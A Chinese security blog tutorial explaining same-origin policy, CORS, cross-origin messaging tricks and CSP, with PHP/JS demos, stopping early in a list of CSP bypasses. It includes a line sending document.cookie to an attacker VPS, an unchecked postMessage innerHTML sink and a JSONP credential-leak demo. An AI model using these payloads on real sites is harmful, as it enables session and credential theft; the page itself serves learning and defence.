<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="Linux提权"/>








  <link rel="alternate" href="/atom.xml" title="Tomas'Blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="http://yoursite.com/2020/08/19/sop_cors_csp/"/>


<meta name="description" content="SOP_CORS_CSP同源策略 ⭐ 阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限 同源的特征 同协议 如：https:&#x2F;&#x2F;exp.org 与 http:&#x2F;&#x2F;exp.org 不同源 同端口 如：http:&#x2F;&#x2F;exp.org 与 http:&#x2F;&#x2F;exp.org:8080 不同源 同域名 如：http:&#x2F;&#x2F;aaa.org 与 http:&#x2F;&#x2F;bbb.org 不同源   同">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux提权">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;08&#x2F;19&#x2F;sop_cors_csp&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:description" content="SOP_CORS_CSP同源策略 ⭐ 阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限 同源的特征 同协议 如：https:&#x2F;&#x2F;exp.org 与 http:&#x2F;&#x2F;exp.org 不同源 同端口 如：http:&#x2F;&#x2F;exp.org 与 http:&#x2F;&#x2F;exp.org:8080 不同源 同域名 如：http:&#x2F;&#x2F;aaa.org 与 http:&#x2F;&#x2F;bbb.org 不同源   同">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;cors-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;document-name-alert.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;document-name-cors.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;window-name-alert.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;postmessage-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;postmessage-alert.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;jsonp-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;jsonp-username-password.jpg">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;iframe-alert.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;nonce-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;nonce-chrome-error.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;svg-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;img-example.png">
<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;scp&#x2F;img-chrome-error.png">
<meta property="og:updated_time" content="2020-08-20T14:00:47.491Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;sop_cors_csp&#x2F;cors&#x2F;cors-example.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> Linux提权 - Tomas'Blog </title>
  </head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">Tomas'Blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Linux提权
        
      </h1>

      <time class="post-time">
          8月 19 2020
      </time>
    </header>
    
            <div class="post-content">
            <h1 id="SOP-CORS-CSP"><a href="#SOP-CORS-CSP" class="headerlink" title="SOP_CORS_CSP"></a>SOP_CORS_CSP</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ul>
<li>⭐ 阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限</li>
<li>同源的特征<ul>
<li>同协议 如：<a href="https://exp.org" target="_blank" rel="noopener">https://exp.org</a> 与 <a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 不同源</li>
<li>同端口 如：<a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 与 <a href="http://exp.org:8080" target="_blank" rel="noopener">http://exp.org:8080</a> 不同源</li>
<li>同域名 如：<a href="http://aaa.org" target="_blank" rel="noopener">http://aaa.org</a> 与 <a href="http://bbb.org" target="_blank" rel="noopener">http://bbb.org</a> 不同源</li>
</ul>
</li>
<li>同源策略的限制<ul>
<li>限制了不同源之间的请求交互，例如在使用XMLHttpRequest或fetch函数时则会受到同源策略的约束</li>
<li>限制浏览器中不同源的框架之间是不能进行js的交互操作的，例如通过iframe和window.open产生的不同源的窗口</li>
</ul>
</li>
<li>同源策略的注解<ul>
<li>对于<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;link&gt;</code>这类属性带有src，href的标签，允许跨域加载</li>
<li>跨域请求可以发出，但是浏览器查看返回包发现跨域且无CORS头则会丢弃，而且不同子域之间默认是不同源的</li>
<li>IE未将端口号加入到同源策略的组成部分之中，因此company.com:81/index.html和company.com/index.html属于同源并且不受任何限制</li>
</ul>
</li>
</ul>
<h2 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h2><h3 id="0X00-CORS简介"><a href="#0X00-CORS简介" class="headerlink" title="0X00 CORS简介"></a>0X00 CORS简介</h3><ul>
<li>CORS跨域资源共享（Origin/Access-Control-Allow-Origin）<ul>
<li>AJAX的XMLHttpRequest请求</li>
<li>简单请求（simple request）– HEAD/GET/POST</li>
<li>非简单请求（not-so-simple request）–PUT/OPTIONS</li>
</ul>
</li>
<li>JSONP（JSON with Padding)，应用JSON的一种新方法<ul>
<li>JOSNP允许页面接受另一个域的JSON数据，通过在页面增加一个可以从其它域加载带有回调的JSON响应的<code>&lt;script&gt;</code>标签</li>
</ul>
</li>
<li>代理（通过接口的方式，后台调用php文件获取然后返回给前端）</li>
<li>跨文档通信（postMessage()会异步的触发window上的onmessage事件）</li>
<li>document.domain（解决不同window之间不能进行交互操作的问题）</li>
<li>window.name（window.name在页面的生命周期里共享一个window.name）</li>
<li>WebSocket（浏览器允许脚本直连一个WebSocket地址而不管同源策略）</li>
</ul>
<h3 id="0X01-CORS"><a href="#0X01-CORS" class="headerlink" title="0X01 CORS"></a>0X01 CORS</h3><ul>
<li>▲ CORS头就是为了突破不同源之间的请求交互这一限制而产生的</li>
<li>只要HTTP返回<code>Access-Control-Allow-Origin:http://test2.www.xyz</code>，test2.<a href="http://www.xyz的跨域请求的响应会被浏览器正确的返回" target="_blank" rel="noopener">www.xyz的跨域请求的响应会被浏览器正确的返回</a></li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?</span><br><span class="line">    header(&quot;Access-Control-Allow-Origin:http://test2.www.xyz&quot;);</span><br><span class="line">    echo &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">//Console台输入</span><br><span class="line">fetch(&apos;//test1.www.xyz/1.php&apos;).then(function(data)&#123;</span><br><span class="line">  return data.text()</span><br><span class="line">&#125;).then(function(data)&#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/cors-example.png" alt="cors-example"></p>
<ul>
<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则所有的跨域访问响应都会被允许</li>
<li>如果请求需要带上Cookie，则需要服务器设置<code>Access-Control-Allow-Credentials:true</code><ul>
<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则不管有没有设置<code>Access-Control-Allow-Credentials:true</code>，带Cookie的请求都会失败</li>
</ul>
</li>
</ul>
<h3 id="0X02-document-domain"><a href="#0X02-document-domain" class="headerlink" title="0X02 document.domain"></a>0X02 document.domain</h3><ul>
<li>针对同源策略的第二个限制，不同窗口之间的同源限制</li>
<li>▲ 只适用于顶级域名相同子域名不同之间的同源策略 -&gt; 不同子域名之间默认不同源，但是可以通过设置document.domain为相同的更高级域名，来使不同子域同源</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//不设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xtz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;p</span><br><span class="line"></span><br><span class="line">//设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//bbb.evoa.me/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/document-name-alert.png" alt="document-name-alert"></p>
<ul>
<li><p>注释</p>
<ul>
<li><p>document.domain只可以被设置为他的当前域或其当前域的父域</p>
</li>
<li><p>document.domain的赋值操作会导致端口号被重写为NULL，所以test1.<a href="http://www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患" target="_blank" rel="noopener">www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患</a></p>
</li>
<li><p>同一窗体不同窗口之间（iframe中的或window.open打开的）是能够获取到彼此的window对象的，如iframe.contentWindow可以获取iframe的window对象，但是不同源的情况下这个window对象的大部分属性和方法是受限制的</p>
<p><img src="/images/sop_cors_csp/cors/document-name-cors.png" alt="document-name-cors"></p>
</li>
</ul>
</li>
<li><p>▲ 如果某个子域为了和根域通信，根域设置了document.domain为根域，那么其他子域如果有xss漏洞可以直接跨同源攻击根域和同样设置了document.domain的其他子域</p>
</li>
</ul>
<h3 id="0X03-window-name"><a href="#0X03-window-name" class="headerlink" title="0X03 window.name"></a>0X03 window.name</h3><ul>
<li>window对象有个name属性，该属性有个特征<ul>
<li>在一个窗口(window)的生命周期内，窗口载入的所有的页面都是共享一个window.name的</li>
<li>每个页面对window.name都有读写的权限</li>
<li>window.name是持久存在一个窗口载入过的所有页面中，并不会因新页面的载入而进行重置</li>
</ul>
</li>
<li>▲ window.name几乎不受同源策略的影响</li>
<li>测试代码<ul>
<li>访问流程：通过Console台的xx.contentWindow.name访问iframe中的name属性，浏览器返回了跨域访问拒绝。但是我们通过设置iframe的src为3.php (3.php可以不与1.php同域)，在iframe中的所有页面共享window.name，然后3.php中的脚本访问到不同源的页面2.php并获取到了window.name</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;xx&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/3.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(window.name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/window-name-alert.png" alt="window-name-alert"></p>
<ul>
<li>注释<ul>
<li>window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚至更大的一个容量，具体取决于不同的浏览器</li>
<li>▲ 不要把敏感数据存在window.name中，否则敏感数据可以被任何其他网页的JS脚本获取</li>
</ul>
</li>
</ul>
<h3 id="0X04-location-hash"><a href="#0X04-location-hash" class="headerlink" title="0X04 location.hash"></a>0X04 location.hash</h3><ul>
<li>location.hash其实就是URL的锚部分(从#号开始的部分)</li>
<li>原理<ul>
<li>改变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递</li>
<li>不同域下location.hash也是不能相互读取的</li>
</ul>
</li>
<li>具体做法<ul>
<li>A域的页面a加载一个iframe，设置iframe的src为B域的b页面+#传输给b的数据</li>
<li>此时b页面的js脚本可以通过读取location.hash获得页面a传过来的数据，然后在b页面再生成一个iframe，src指向A域的页面c+#传输给a的数据</li>
<li>由于页面c与页面a同域同源，所以页面c的脚本可以修改a的locaition.hash</li>
</ul>
</li>
</ul>
<h3 id="0X05-PostMessage"><a href="#0X05-PostMessage" class="headerlink" title="0X05 PostMessage"></a>0X05 PostMessage</h3><ul>
<li>▲ window.postMessage()方法可以安全地实现跨源通信</li>
<li>当被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个MessageEvent消息函数<ul>
<li>第一个参数为发送的消息</li>
<li>第二个参数是匹配发送给的窗口的url地（可以使用*，代表无限制通配），若目标url和此参数不匹配，消息就不会被发送</li>
</ul>
</li>
<li>被接受窗口则可以通过监听message事件来获取接受信息</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        alert(e.data);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    parent.postMessage(&apos;test&apos;,&apos;*&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-example.png" alt="postmessage-example"></p>
<ul>
<li>恶意代码测试（事件监听没有判断事件的来源）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;flag&apos;,&apos;flag&#123;this_is_flag&#125;&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/evil.php</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;//test1.www.xyz/1.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">//正则过滤的1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;flag&quot;,&quot;flag&#123;this_is_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        if(/^http:\/\/.*www\.xyz$/.test(e.origin))</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;   --------------&gt; 绕过方法：需要一个存在后缀为www.xyz的域名即可</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-alert.png" alt="postmessage-alert"></p>
<h3 id="0X06-JSONP"><a href="#0X06-JSONP" class="headerlink" title="0X06 JSONP"></a>0X06 JSONP</h3><ul>
<li><code>&lt;script&gt;</code>标签可以跨域加载资源，但是返回内容如果不符合JS语法同样无法获取数据，JSONP则是通过返回符合JS语法的数据内容使资源能够跨域加载</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    console.log(&quot;DATA:&quot;,data);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test2.www.xyz/2.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &apos;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&apos;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-example.png" alt="jsonp-example"></p>
<ul>
<li>运行过程：1.php页面先设定好输出数据的函数，通过<code>&lt;script&gt;</code>标签请求2.php并带有函数名参数，2.php把数据当函数参数传入并根据函数名输出对应函数调用语句，1.php获得响应后自动调用函数即可获取数据</li>
<li>不存在任何验证的JSONP接口</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----test2.www.xyz/evail.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    alert(&quot;username：&quot;+data.username+&quot;password：&quot;+data.password);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test1.www.xyz/1.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &quot;&#123;&apos;username&apos;:&apos;test1&apos;,&apos;password&apos;:&apos;test1&apos;&#125;&quot;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-username-password.jpg" alt="jsonp-username-password"></p>
<ul>
<li>▲ 未设置Conten-type可以导致反射性XSS<ul>
<li>但是就算设置好了Conten-type也可能会有安全隐患</li>
</ul>
</li>
<li>▲ 这种用户完全可控点可以结合很多其他缺陷产生漏洞，所以这种接口还应该过滤非法字符</li>
<li>防御方法<ul>
<li>验证referer，很多接口验证referer的正则有误，可以通过绕过正则继续攻击</li>
<li>验证token</li>
</ul>
</li>
</ul>
<h2 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a>内容安全策略</h2><blockquote>
<p>   CSP, Content Security Policy</p>
</blockquote>
<ul>
<li>官方解释<ul>
<li>一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本(XSS)和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途</li>
</ul>
</li>
<li>通俗理解<ul>
<li>开发者明确告诉客户端（制定比较严格的策略和规则），哪些外部资源是可以加载和执行的</li>
</ul>
</li>
<li>概念理解<ul>
<li>CSP就是一个统一有效的防止网站受到XSS攻击的防御方法</li>
<li>CSP是一种白名单策略</li>
</ul>
</li>
</ul>
<h5 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h5><ul>
<li>通过HTTP头信息的Content-Security-Policy的字段（配置文件或者后端设置）</li>
<li>通过网页的<code>&lt;meta&gt;</code>标签<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li>
</ul>
</li>
<li>修改的限制<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39; https://cdn.xxx.com&quot;&gt;</code>  -&gt; content添加白名单 -&gt; 即可以<code>script</code>标签引入cdb</li>
</ul>
</li>
</ul>
<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><ul>
<li>script-src: 定义了页面中Javascript的有效来源</li>
<li>style-src：定义了页面中CSS样式的有效来源</li>
<li>img-src: 定义了页面中图片和图标的有效来源</li>
<li>font-src: 定义了字体加载的有效来源</li>
<li>media-src: 用于限制允许传输视频和音频的来源。</li>
<li>object-src: 可对 Flash 和其他插件进行控制。</li>
<li>plugin-types: 用于限制页面可以调用的插件种类。</li>
<li>child-src: 定义了web workers以及嵌套的浏览上下文（如<code>&lt;frame&gt;和&lt;iframe&gt;</code>）的源</li>
<li>content-src: 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源</li>
<li>▲ default-src: 自定义默认形式<ul>
<li>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值</li>
</ul>
</li>
</ul>
<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><ul>
<li>‘none’ -&gt; img-src ‘none’<ul>
<li>不允许任何内容</li>
</ul>
</li>
<li>‘self’ -&gt; img-src ‘self’<ul>
<li>代表和文档同源，包括相同的URL协议和端口号。两侧单引号是必须的。</li>
</ul>
</li>
<li>‘unsafe-inline’ -&gt; script-src ‘unsafe-inline’<ul>
<li>允许加载inline资源（例如常见的style属性，onclick，inline js和inline css等等）</li>
</ul>
</li>
<li>‘unsafe-eval’ -&gt; script-src ‘unsafe-eval’<ul>
<li>允许加载动态js代码，例如eval()</li>
</ul>
</li>
<li>data: -&gt; img-src data:<ul>
<li>允许来自相同来源的内容（相同的协议、域名和端口）</li>
</ul>
</li>
<li>注解<ul>
<li>如果不特别指定<code>&#39;unsafe-inline&#39;</code>时，页面上所有inline样式和脚本都不会执行</li>
<li>不特别指定<code>&#39;unsafe-eval&#39;</code>，页面上不允许使用new Function，setTimeout，eval等方式执行动态代码</li>
</ul>
</li>
</ul>
<h5 id="收集不匹配规则的日志"><a href="#收集不匹配规则的日志" class="headerlink" title="收集不匹配规则的日志"></a>收集不匹配规则的日志</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//发生的CSP头</span><br><span class="line">Content-Security-Policy-Report-Only: script-src &apos;self&apos;; report-uri http://test/</span><br><span class="line"></span><br><span class="line">//这样，如果页面上有inline JS，依然会执行，只是浏览器会向指定地址发送一个POST请求，包含这样的信息</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://test/test.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src &apos;self&apos;&quot;,&quot;original-policy&quot;:&quot;script-src &apos;self&apos;; report-uri http://test/&quot;,&quot;blocked-uri&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略 (CSP)</a></li>
</ul>
<h2 id="内容安全策略的绕过"><a href="#内容安全策略的绕过" class="headerlink" title="内容安全策略的绕过"></a>内容安全策略的绕过</h2><ul>
<li>location.href</li>
<li>link标签导致的绕过</li>
<li>使用iframe绕过</li>
<li>用CDN绕过</li>
<li>站点可控静态资源绕过</li>
<li>站点可控JSONP绕过</li>
<li>Base-uri绕过</li>
<li>不完整script绕过nonce</li>
<li>object-src绕过（PDFXSS） -&gt; 暂无学</li>
<li>SVG绕过</li>
<li>不完整的资源标签获取资源</li>
<li>CSS选择器获取内容  -&gt;  暂无学</li>
<li>CRLF绕过</li>
</ul>
<h3 id="0X00-location-href"><a href="#0X00-location-href" class="headerlink" title="0X00 location.href"></a>0X00 location.href</h3><ul>
<li>CSP不影响location.href跳转</li>
<li>利用条件<ul>
<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
</ul>
</li>
<li>将cookie打到个人vps上<ul>
<li><code>location.href = &quot;vps_ip:xxxx?+document.cookie</code></li>
</ul>
</li>
</ul>
<h3 id="0X01-link标签导致的绕过"><a href="#0X01-link标签导致的绕过" class="headerlink" title="0X01 link标签导致的绕过"></a>0X01 link标签导致的绕过</h3><ul>
<li>▲ 方法较老，不一定能成功实现，现在大部分浏览器的CSP开始约束这个标签</li>
<li>利用条件<ul>
<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
</ul>
</li>
<li>利用标签将数据外带</li>
</ul>
